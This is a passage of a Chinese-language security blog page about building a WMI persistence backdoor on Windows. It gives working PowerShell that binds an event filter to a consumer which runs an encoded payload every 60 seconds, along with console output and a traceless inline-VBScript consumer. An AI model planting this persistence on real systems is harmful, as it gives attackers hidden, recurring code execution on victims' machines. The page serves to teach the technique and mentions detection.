+Qualifiers <span style="color:#960050;background-color:#1e0010">:</span> {CIMTYPE}
+</code></pre></div></li>
+<li>
+<p>Client定时执行powershell命令</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#读取加密指令</span>
+$EncodedPayload=(<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_Command&#39;</span>).Properties[<span style="color:#e6db74">&#39;EnCommand&#39;</span>].Value
+$filterName = <span style="color:#e6db74">&#39;BotFilter56&#39;</span>
+$consumerName = <span style="color:#e6db74">&#39;BotConsumer56&#39;</span>
+<span style="color:#75715e">#创建一个__EventFilter，用于设定触发条件，每隔60s执行一次</span>
+$Query = <span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34;</span>
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$filterName;EventNameSpace=<span style="color:#e6db74">&#34;root\cimv2&#34;</span>;QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>;Query=$Query} -ErrorAction Stop
+
+<span style="color:#75715e">#创建一个CommandLineEventConsumer，用于设定执行的操作</span>
+$Arg =@{
+        Name=$consumerName
+            CommandLineTemplate=<span style="color:#e6db74">&#34;C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe  -NonInteractive  -enc $EncodedPayload&#34;</span>
+}
+
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments $Arg
+<span style="color:#75715e">#用于绑定filter和consumer</span>
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{<span style="color:#66d9ef">Filter</span>=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\system32&gt; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{<span style="color:#66d9ef">Filter</span>=$WMIEventFilter;Consumer=$WMIEventConsumer}
+
+__GENUS                 <span style="color:#960050;background-color:#1e0010">:</span> 2
+__CLASS                 <span style="color:#960050;background-color:#1e0010">:</span> __FilterToConsumerBinding
+__SUPERCLASS            <span style="color:#960050;background-color:#1e0010">:</span> __IndicationRelated
+__DYNASTY               <span style="color:#960050;background-color:#1e0010">:</span> __SystemClass
+__RELPATH               <span style="color:#960050;background-color:#1e0010">:</span> __FilterToConsumerBinding.Consumer=<span style="color:#e6db74">&#34;CommandLineEventConsumer.Name=\&#34;</span>BotConsumer56\<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#66d9ef">Filter</span>=<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">                          __EventFilter.Name=\&#34;</span>BotFilter56\<span style="color:#e6db74">&#34;&#34;</span>
+__PROPERTY_COUNT        <span style="color:#960050;background-color:#1e0010">:</span> 7
+__DERIVATION            <span style="color:#960050;background-color:#1e0010">:</span> {__IndicationRelated, __SystemClass}
+__SERVER                <span style="color:#960050;background-color:#1e0010">:</span> DEVC1
+__NAMESPACE             <span style="color:#960050;background-color:#1e0010">:</span> ROOT\subscription
+__PATH                  <span style="color:#960050;background-color:#1e0010">:</span> \\DEVC1\ROOT\subscription<span style="color:#960050;background-color:#1e0010">:</span>__FilterToConsumerBinding.Consumer=<span style="color:#e6db74">&#34;CommandLineEventConsumer.Name=\
+</span><span style="color:#e6db74">                          &#34;</span>BotConsumer56\<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#66d9ef">Filter</span>=<span style="color:#e6db74">&#34;__EventFilter.Name=\&#34;</span>BotFilter56\<span style="color:#e6db74">&#34;&#34;</span>
+Consumer                <span style="color:#960050;background-color:#1e0010">:</span> CommandLineEventConsumer.Name=<span style="color:#e6db74">&#34;BotConsumer56&#34;</span>
+CreatorSID              <span style="color:#960050;background-color:#1e0010">:</span> {1, 5, 0, 0...}
+DeliverSynchronously    <span style="color:#960050;background-color:#1e0010">:</span> False
+DeliveryQoS             <span style="color:#960050;background-color:#1e0010">:</span>
+<span style="color:#66d9ef">Filter</span>                  <span style="color:#960050;background-color:#1e0010">:</span> __EventFilter.Name=<span style="color:#e6db74">&#34;BotFilter56&#34;</span>
+MaintainSecurityContext <span style="color:#960050;background-color:#1e0010">:</span> False
+SlowDownProviders       <span style="color:#960050;background-color:#1e0010">:</span> False
+PSComputerName          <span style="color:#960050;background-color:#1e0010">:</span> DEVC1
+</code></pre></div></li>
+</ol>
+<p>检测方法：@0x04 相关运用-WMI后门检测及清除【管理员权限】</p>
+<h3 id="wmi-backdoor-相关知识对于定时启动功能的进一步说明">WMI Backdoor 相关知识（对于定时启动功能的进一步说明）</h3>
+<p>1、EventFilter—可以理解为通过执行WQL查询来设定触发条件，包括以下查询：</p>
+<p>（1）Data queries</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">SELECT * FROM Win32_NTLogEvent WHERE Logfile = <span style="color:#960050;background-color:#1e0010">&#39;</span>Application
+</code></pre></div><p>（2）Event queries</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA <span style="color:#e6db74">&#39;Win32_Service&#39;</span> AND TargetInstance._Class = <span style="color:#e6db74">&#39;win32_TerminalService&#39;</span>
+</code></pre></div><p>（3）Schema queries</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">SELECT * FROM meta_class WHERE __this ISA <span style="color:#e6db74">&#34;Win32_BaseService&#34;</span>
+</code></pre></div><p>2、 consumer—可以理解为条件满足后执行的操作，包括如下查询：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">（</span>1<span style="color:#960050;background-color:#1e0010">）</span>ActiveScriptEventConsumer    
+<span style="color:#960050;background-color:#1e0010">（</span>2<span style="color:#960050;background-color:#1e0010">）</span>LogFileEventConsumer 
+<span style="color:#960050;background-color:#1e0010">（</span>3<span style="color:#960050;background-color:#1e0010">）</span>NTEventLogEventConsumer
+<span style="color:#960050;background-color:#1e0010">（</span>4<span style="color:#960050;background-color:#1e0010">）</span>SMTPEventConsumer
+<span style="color:#960050;background-color:#1e0010">（</span>5<span style="color:#960050;background-color:#1e0010">）</span>CommandLineEventConsumer
+</code></pre></div><p>3、使用consumer执行vbs脚本的两种方式</p>
+<p>（1）直接执行现有脚本</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">instance of ActiveScriptEventConsumer as $Cons
+{
+    Name = <span style="color:#e6db74">&#34;ASEC&#34;</span>;
+    ScriptingEngine = <span style="color:#e6db74">&#34;VBScript&#34;</span>;
+    ScriptFileName = <span style="color:#e6db74">&#34;c:\\asec2.vbs&#34;</span>;
+};
+</code></pre></div><p>（2）内嵌脚本，不会留下痕迹</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">instance of ActiveScriptEventConsumer as $Cons
+{
+    Name = <span style="color:#e6db74">&#34;ASEC&#34;</span>;
+    ScriptingEngine = <span style="color:#e6db74">&#34;VBScript&#34;</span>;
+
+    ScriptText =
+        <span style="color:#e6db74">&#34;Dim objFS, objFile\n&#34;</span>
+        <span style="color:#e6db74">&#34;Set objFS = CreateObject(\&#34;</span>Scripting.FileSystemObject\<span style="color:#e6db74">&#34;)\n&#34;</span>
+        <span style="color:#e6db74">&#34;Set objFile = objFS.OpenTextFile(\&#34;</span>C:\\ASEC.log\<span style="color:#e6db74">&#34;,&#34;</span>
+        <span style="color:#e6db74">&#34; 8, true)\nobjFile.WriteLine \&#34;</span>Time<span style="color:#960050;background-color:#1e0010">:</span> \<span style="color:#e6db74">&#34; &amp; Now &amp; \&#34;</span>;<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">        &#34;</span> Entry made by<span style="color:#960050;background-color:#1e0010">:</span> ASEC\<span style="color:#e6db74">&#34;\nobjFile.WriteLine&#34;</span>
+        <span style="color:#e6db74">&#34; \&#34;</span>Application closed. UserModeTime<span style="color:#960050;background-color:#1e0010">:</span>  \<span style="color:#e6db74">&#34; &amp; &#34;</span>
+        <span style="color:#e6db74">&#34;TargetEvent.TargetInstance.UserModeTime &amp;_\n&#34;</span>
+        <span style="color:#e6db74">&#34;\&#34;</span>; KernelModeTime<span style="color:#960050;background-color:#1e0010">:</span> \<span style="color:#e6db74">&#34; &amp; &#34;</span>
+        <span style="color:#e6db74">&#34;TargetEvent.TargetInstance.KernelModeTime &#34;</span>
+        <span style="color:#e6db74">&#34;&amp; \&#34;</span> <span style="color:#66d9ef">[hundreds of nanoseconds]</span>\<span style="color:#e6db74">&#34;\n&#34;</span>
+        <span style="color:#e6db74">&#34;objFile.Close\n&#34;</span>;
+};
+</code></pre></div>
+  
+  </div>
+</article>
+
+
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Maka8ka 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/post/">Posts</a></li>
+         
+        <li><a href="/categories/">Categories</a></li>
+         
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+</html>
